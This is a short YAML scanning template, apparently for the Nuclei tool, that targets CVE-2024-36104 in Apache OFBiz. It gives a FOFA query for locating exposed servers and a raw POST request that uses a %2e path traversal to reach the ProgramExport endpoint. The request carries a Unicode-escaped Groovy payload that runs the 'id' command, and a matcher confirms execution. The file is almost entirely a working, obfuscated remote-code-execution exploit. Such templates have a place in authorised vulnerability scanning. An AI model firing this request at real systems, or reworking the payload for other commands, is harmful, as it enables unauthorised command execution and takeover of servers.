id: Apache-OFBiz-ProgramExport-RCE

info:
  name: Apache OFBiz 路径遍历导致 RCE（CVE-2024-36104）
  author: HuanXiong
  severity: critical
  description: |-
    fofa-query: app="Apache_OFBiz"
    Apache OFBiz 18.12.14 之前版本存在命令执行漏洞。该漏洞源于 org.apache.otbiz.webapp.control.ControlFiter 类对路径（请求 URL 中的特殊字符（如；、%2e）限制不当，导致攻击者能够绕过后台功能点的过滤器验证，并通过 webtools/control/ProgramExport 接口的编程导出功能执行任意 Groovy 代码获取系统权限。
  reference:
    - 
  tags: RCE
    
http:
  - raw:
      - |
        POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: {{length}}

        groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b

    matchers:
      - type: dsl
        name: RCE
        dsl:
          - 'status_code==200 && contains_all(body,"java.lang.Exception:")'